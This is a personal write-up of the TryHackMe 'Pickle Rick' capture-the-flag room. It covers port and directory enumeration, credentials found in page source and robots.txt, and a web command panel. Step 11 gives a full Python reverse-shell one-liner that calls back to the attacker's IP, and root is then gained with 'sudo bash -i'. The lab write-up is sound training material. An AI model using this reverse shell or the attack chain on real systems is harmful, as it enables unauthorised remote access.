# Pickle Rick
+ Link: https://tryhackme.com/r/room/picklerick
+ Type: Challenge

+ Target IP Address: 10.10.162.36
+ AttackBox IP Address: 10.10.139.230

## Tools
+ NMAP
+ Gobuster
+ enum4linux
+ Dirb
+ Netcat

## External Resources
+ https://stawm.design.blog/2020/05/17/pickle-rick-thm-writeup/
+ https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet

## Task 01 | Pickle Rick
1. `nmap -sV 10.10.162.36` revealed 2 open ports with the services: OpenSSH and Apache.  
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room05/Screenshots/01.png)
  
2. Went to http://10.10.162.36 to inspected its source code. Found a username "R1ckRul3s".
3. `gobuster dir -u http://10.10.162.36 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt` revealed a few directories: "/assets" and "/robots".  
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room05/Screenshots/02.png)
  
4. Looked through the found directories. http://10.10.162.36/robots.txt lead to a possible password "Wubbalubbadubdub".
5. I tried `dirb http://10.10.162.36`, `enum4linux -a 10.10.162.36`, and Gobuster with different word lists, but found nothing noteworthy.
6. After trying `gobuster dir -u http://10.10.162.36 -w /usr/share/wordlists/SecLists/Discovery/Web-Content/common.txt -x html,php` I found a few more directories: "/login.php" and "/portal.php".  
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room05/Screenshots/03.png)
  
7. Both of the newly discovered webpages went to the same login page. So, I tried out the username and password and got access. Upon logging into "Rick Portal" I found that most webpages were locked, except a place where you can input commands.
8. While I could `ls`, the `cat`command was disabled. So, I tried to see if there was a way I could gain a reverse shell.
9. Using the command `which python3` I was able to comfirm that the target machine did have Python3 on it.  
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room05/Screenshots/04.png)
  
10. I started up a Netcat listener with `nc -lvp 4444` on the AttackBox.
11. On the "Command Panel" I entered a modified command from pentestmonkey, `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.139.230",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'`, to start the reverse shell. Sucess!  
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room05/Screenshots/05.png)
  
12. On ther terminal with the listener, I ran `ls` to see what's in the directory and `cat Sup3rS3cretPickl3Ingred.txt` to get ingredient #1.
13. After looking around in the file system, I found a user directory labeled "rick" and changed to it.  
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room05/Screenshots/06.png)
  
14. `ls` to see what's in the directory and `cat "second ingredients"` to get ingredient 2.  
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room05/Screenshots/07.png)
  
15. `whoami` and `sudo -l` to see what commands the "www-data" user could execute.
16. `sudo bash -i` to get root access.
17. Moved to /root, `ls` and found the final ingredient.  
   ![](https://github.com/ArcingFirehawk/My-THM-Write-Ups/blob/main/Room05/Screenshots/08.png)
  
## Learned
+ Gobuster's `-x` flag, which allows someone to search for specific file extensions. Can be used to search for common website file extensions (i.e. html and php).
+ A website for reverse shell commands, https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet.